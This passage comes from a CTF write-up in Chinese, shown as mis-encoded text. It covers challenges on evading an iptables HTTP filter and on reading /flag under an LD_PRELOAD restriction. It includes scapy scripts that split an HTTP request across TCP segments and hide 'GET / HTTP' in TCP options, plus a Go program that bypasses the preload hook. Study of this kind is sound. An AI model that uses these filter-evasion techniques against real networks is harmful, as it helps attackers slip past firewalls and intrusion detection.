ä» iptables å¯ä»¥è§„åˆ™çœ‹å‡ºï¼Œéœ€è¦æŠŠ POST é”™å¼€ã€‚ä½†é˜²ç«å¢™è¿‡æ»¤åªé’ˆå¯¹ TCPï¼Œç”±æ­¤ IP æŠ¥æ–‡åˆ†ç‰‡æ–¹æ³•ä¸å¯ç”¨ï¼ˆå› ä¸ºåœ¨å†…æ ¸å·²ç»æ‹¼å¥½äº†ï¼‰ã€‚æ‰€ä»¥è¦ç”¨åˆ° TCP åˆ†æ®µï¼Œåˆ†æ®µåçš„ TCP ä¼šè‡ªåŠ¨æ‹¼æ¥å¥½æäº¤ç»™ä¸Šä¸€å±‚ä¸ä¼šå½±å“åˆ° HTTPã€‚ä»£ç å®ç°é—®é—® CHAT GPT æœ‰å•¥æ€è·¯ï¼Œç»ä»‹ç»äºæ˜¯å­¦ä¹ äº† `scapy`ã€‚

### Â æˆ‘çš„ POST

ç”¨ `scapy` æ¨¡æ‹Ÿ `TCP åˆ†æ®µæ•°æ®åŒ…`ï¼Œå°† `POST` é”™å¼€ä¸º `PO` å’Œ `ST`ï¼Œwireshark æŠ“åŒ…è·å– flagã€‚

```python
from scapy.all import *  
  
DST = '202.38.93.111'  
DPORT = 18080  
HTTP_REQUEST = b'POST / HTTP/1.1\r\nHost: \r\nContent-Length: 101\r\n\r\n token'  
syn = IP(dst=DST) / TCP(sport=random.randint(1024, 65535), dport=DPORT, flags='S')  
syn_ack = sr1(syn)  
  
first_segment = IP(dst=DST)/TCP(dport=DPORT, sport=syn_ack[TCP].dport,  
                            seq=syn_ack[TCP].ack, ack=syn_ack[TCP].seq + 1, flags='PA') / Raw(load=HTTP_REQUEST[:2])  
  
first_segment_ack = sr1(first_segment)  
  
second_segment = IP(dst=DST)/TCP(dport=DPORT, sport=first_segment_ack[TCP].dport,  
                            seq=first_segment_ack[TCP].ack, ack=first_segment_ack[TCP].seq + 1, flags='PA') / Raw(load=HTTP_REQUEST[2:])  
  
send(second_segment)
```

### æˆ‘çš„ P

è¿™ä¸€é—®ç”¨ä¸Šä¸€é—®çš„ä»£ç åŒæ ·å¯ä»¥é€šè¿‡ï¼ˆè™½ç„¶æˆ‘ä¹Ÿçœ‹ä¸æ‡‚ iptable é‚£æ¡è§„åˆ™å†™çš„æ˜¯ä»€ä¹ˆæ„æ€ï¼‰ã€‚

### æˆ‘çš„ GET

è¿™ä¸ªå°±éœ€è¦å‘ `TCP å¤´éƒ¨` å¡ä¸œè¥¿äº†ï¼Œé—®é—® CHAT GPT å‘ç°å”¯ä¸€å¯ä»¥å¡å…¥çš„å°±æ˜¯ `OPTION` å­—æ®µï¼ŒæŠŠ `GET / HTTP ` å¡åˆ° `TCP å¤´éƒ¨` çš„ `OPTION` é‡Œé¢å°±å¯ä»¥äº†ï¼Œè¿™é‡Œ `SYN` è¯·æ±‚ä¹Ÿè¦æ”¾è¿›å»ï¼Œä¸ç„¶åˆšå¼€å§‹æ¡æ‰‹å°±ä¼šè¢« `RST`ã€‚åŒæ ·è¯·æ±‚å‘é€å®Œæ¯•ï¼Œwireshark æŸ¥çœ‹ flagã€‚

```python
from scapy.all import *  
  
DST = '202.38.93.111'  
DPORT = 18082  
HTTP_REQUEST = b'POST / HTTP/1.1\r\nHost: \r\nContent-Length: 101\r\n\r\ntoken'  
  
syn = IP(dst=DST) / TCP(sport=random.randint(1024, 65535), dport=DPORT, flags='S', options=[(253, b'GET / HTTP')])  
syn_ack = sr1(syn)  
  
request = IP(dst=DST) / TCP(dport=DPORT, sport=syn_ack[TCP].dport,  
                            seq=syn_ack[TCP].ack, ack=syn_ack[TCP].seq + 1, flags='A',  
                            options=[(253, b'GET / HTTP')]) / Raw(load=HTTP_REQUEST)  
  
send(request)
```

## ä¸ºä»€ä¹ˆè¦æ‰“å¼€ /flag ğŸ˜¡

### LD_PRELOAD, love!

ä¹‹å‰å†™ golang é‡åˆ°è°ƒç”¨è¿‡ç³»ç»Ÿ lib è¿™ç±»é—®é¢˜ï¼Œäºæ˜¯å‘ç°ç”¨ golang å¯ç”¨ CGGO ç¼–è¯‘ï¼Œå°±ä¸ä¼šç”¨åˆ°ç³»ç»Ÿçš„ lib äº†ã€‚

ç¼–è¯‘å‘½ä»¤ï¼š`CGO_ENABLED=1 GOOS=linux GOARCH=amd64 go build -o x main.go`ï¼Œgolang ä»£ç ï¼š

```go
package main

import (
	"fmt"
	"io/ioutil"
	"os"
)

func main() {
	file, err := os.Open("/flag")
	if err != nil {
		return
	}
	defer file.Close()

	content, err := ioutil.ReadAll(file)
	if err != nil {
		return
	}

	fmt.Println(string(content))
}
```

ç¼–è¯‘åæäº¤è·å¾— flagã€‚

## å¼‚æ˜Ÿæ­§é€”

Mindustry å¤„ç†å™¨æŒ‡ä»¤é—®é¢˜ã€‚ä¹‹å‰æœ‰ç©è¿‡ï¼ˆ~~ç”šè‡³è¿˜æœ‰æ— æ•Œä½œå¼Š mod~~ï¼‰é’ååº”å †ç›´æ¥ç”¨ä½œå¼Š mod æ¥å…¥å†·å´æ°´ï¼Œè¿™æ ·å°±ä¸ç”¨æ€•æ‰‹æ®‹ä¹±ç‚¹æŠŠååº”å †å¼•çˆ†äº†ï¼Œåˆ†æä¸€ä¸‹æŒ‡ä»¤è°ƒè¯•å‡ æ¬¡å°±å¯ä»¥å¯åŠ¨å†²å‡»ååº”å †äº†ã€‚è¯¦ç»†è¿‡ç¨‹è¿˜æ˜¯å‚è€ƒå…¶ä»–äººçš„é¢˜è§£å§ã€‚